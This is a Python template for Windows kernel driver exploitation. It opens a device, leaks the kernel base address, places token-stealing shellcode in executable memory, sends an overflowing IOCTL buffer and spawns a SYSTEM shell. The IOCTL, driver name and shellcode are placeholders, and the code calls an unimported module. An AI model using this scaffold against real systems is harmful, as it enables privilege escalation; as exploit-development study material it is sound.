#!/usr/bin/python
# $Id: template_exploit.py,v 1.0 2019/09/20 23:22:59 dhn Exp $

import os
import sys
import struct
from ctypes import * 

# Define WinAPI shorthand
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Define bitmasks
NULL = 0x00
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003

def p32(x):
	""" Interpret strings as packed binary data (unsigned long) """
	return struct.pack("<L", x)

def p64(x):
	""" Interpret strings as packed binary data (unsigned longlong) """
	return struct.pack("<Q", x)

def is_system():
	""" Check if the running process run with SYSTEM privileges """

	whoami = os.popen("whoami").read()
	if "system" in whoami:
		return True
	else:
		return False

def get_handle(lpFileName):
	""" Get device handler """

	dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
	dwShareMode = 0
	lpSecurityAttributes = None
	dwCreationDisposition = OPEN_EXISTING
	dwFlagsAndAttributes = 0
	hTemplateFile = None

	print("[*] Getting device handle")
	handle = kernel32.CreateFileA(
				lpFileName,            # _In_     LPCTSTR
				dwDesiredAccess,       # _In_     DWORD
				dwShareMode,           # _In_     DWORD
				lpSecurityAttributes,  # _In_opt_ LPSECURITY_ATTRIBUTES
				dwCreationDisposition, # _In_     DWORD
				dwFlagsAndAttributes,  # _In_     DWORD
				hTemplateFile)         # _In_opt_ HANDLE

	if not handle or handle == -1:
		sys.exit("[-] Error getting device handle: {:s}".format(FormatError()))
	else:
		print("[+] Got device handle: {:#x}".format(handle))

	return handle

def trigger(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize):
	""" Triggering vulnerable IOCTL """

	lpOutBuffer = None
	nOutBufferSize = 0
	lpBytesReturned = byref(c_ulong())
	lpOverlapped = None

	print("[+] Triggering vulnerable IOCTL ...")
	device = kernel32.DeviceIoControl(
				hDevice,         # _In_        HANDLE
				dwIoControlCode, # _In_        DWORD
				lpInBuffer,      # _In_opt_    LPVOID
				nInBufferSize,   # _In_        DWORD
				lpOutBuffer,     # _Out_opt_   LPVOID
				nOutBufferSize,  # _In_        DWORD
				lpBytesReturned, # _Out_opt_   LPDWORD
				lpOverlapped)    # _Inout_opt_ LPOVERLAPPED

	if not device:
		sys.exit("[-] Error: Not device {:s}".format(FormatError()))

# https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def get_base_address(driver=None):
	""" Returns base address of kernel modules """

	if platform.architecture()[0] == "64bit":
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))

	for base_addr in lpImageBase:
		driver_name = c_char_p("\x00" * driver_name_size.value)
		if base_addr:
			psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print("[+] Retrieving kernel info...")
				print("[+] Kernel version: {:s}".format(driver_name.value))
				print("[+] Kernel base address: {:#x}".format(base_addr))

				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print("[+] Retrieving {:s} info...".format(driver_name))
				print("[+] {:s} base address: {:#x}".format(driver_name, base_addr))
				
				return (base_addr, driver_name.value)
	return None

def alloc_memory_virtualalloc(lpAddress, dwSize, input):
	""" Allocate input buffer """

	flAllocationType = (MEM_COMMIT | MEM_RESERVE)
	flProtect = PAGE_EXECUTE_READWRITE

	print("[*] Allocating input buffer at {:#x}".format(lpAddress))
	address = kernel32.VirtualAlloc(
				lpAddress,         # _In_opt_  LPVOID
				dwSize,            # _In_      SIZE_T
				flAllocationType,  # _In_      DWORD
				flProtect)         # _In_      DWORD

	if not address:
		sys.exit("[-] Error allocating memory: {:#x}".format(kernel32.GetLastError()))
	else:
		print("[+] Input buffer allocated at: {:#x}".format(address))

	memmove(address, input, len(input))
	return address

def main():
	IOCTL = 0xdeadbeef
	lpFileName = "\\\\.\\DRIVER"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x90\x90\x90\x90"
	)

	(base_addr, kernel_version) = get_base_address()
	shellcode = alloc_memory_virtualalloc(0, len(steal_token), steal_token)

	payload = "\x41" * 1337 
	payload += p64(shellcode)

	raw_input("Press Enter to Trigger Vuln (BSOD)") 
	trigger(handle, IOCTL, payload, len(payload))

	# Check if the running process run with SYSTEM privileges
	if is_system():
		print("[+] Spawn SYSTEM shell\n")
		os.system("cmd.exe")
	else:
		print("[-] Exploit failed")

if __name__ == "__main__":
	main()
